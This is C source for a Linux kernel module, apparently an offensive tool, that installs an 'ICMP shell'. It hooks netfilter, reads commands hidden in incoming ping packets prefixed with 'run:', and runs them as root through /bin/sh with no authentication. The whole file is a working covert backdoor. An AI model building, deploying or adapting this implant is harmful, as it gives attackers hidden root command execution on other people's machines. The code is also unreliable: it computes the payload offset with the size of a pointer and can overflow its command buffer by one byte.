#include <linux/module.h>
#include <linux/kernel.h>

#include <linux/netfilter_ipv4.h>
#include <linux/ip.h>
#include <linux/icmp.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("AnyKeyShik");
MODULE_DESCRIPTION("ICMP shell module for execute command from remote machine forwarded throgh ICMP");

#define MAX_CMD_LEN 1976

static struct nf_hook_ops nfho;
struct work_struct cmd_work;
char cmd_str[MAX_CMD_LEN];

static void 
work_handler(struct work_struct *work)
{
    static char *argv[] = {"/bin/sh", "-c", cmd_str, NULL};
    static char *envp[] = {"PATH=/bin:/sbin", NULL};

    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);      
}

DECLARE_WORK(cmd_work, work_handler);

static unsigned int
icmp_cmd_executor(void *priv, struct sk_buff *skb, 
        const struct nf_hook_state *state)
{
    struct iphdr *iph;
  	struct icmphdr *icmph;
    
    unsigned char *user_data;
    unsigned char *tail;

    unsigned char *i;
    int j;

    iph = ip_hdr(skb);
  	icmph = icmp_hdr(skb);

  	if (iph->protocol != IPPROTO_ICMP) {
        return NF_ACCEPT;
  	}
  	if (icmph->type != ICMP_ECHO) {
    	return NF_ACCEPT;
  	}

	user_data = (unsigned char *)( (unsigned char *)icmph + ( sizeof(icmph) ) );
    tail = skb_tail_pointer(skb);

    for (i = user_data, j = 0; i != tail; i++) {
        char c = *(char *)i;

        cmd_str[j++] = c;

        if (c == '\0') {
            break;
        }

        if (j == MAX_CMD_LEN) {
            cmd_str[j] = '\0';
            printk(KERN_INFO "ICMP Shell: read command successfully\n");

            break;                
        }
    }

    if (strncmp(cmd_str, "run:", 4) != 0) {
    	printk(KERN_WARNING "ICMP Shell: wrong command format\n");

        return NF_ACCEPT;
  	} else {
    	for (j = 0; j <= sizeof(cmd_str) / sizeof(cmd_str[0]) - 4; j++) {
      		cmd_str[j] = cmd_str[j + 4];
      		
            if (cmd_str[j] == '\0') {
			    printk(KERN_INFO "ICMP Shell: parse command successfully\n");
                
                break;
            }
    	}
    }

    schedule_work(&cmd_work);

    return NF_ACCEPT;
}

static int __init 
startup(void)
{
	nfho.hook = icmp_cmd_executor;
	nfho.hooknum = NF_INET_PRE_ROUTING;
	nfho.pf = PF_INET;
	nfho.priority = NF_IP_PRI_FIRST;
	
    nf_register_net_hook(&init_net, &nfho);

    printk(KERN_INFO "ICMP Shell: started OK\n");
	
	return 0;
}

static void __exit 
cleanup(void)
{
    nf_unregister_net_hook(&init_net, &nfho);

    printk(KERN_INFO "ICMP Shell: disabled OK\n");
}

module_init(startup);
module_exit(cleanup);

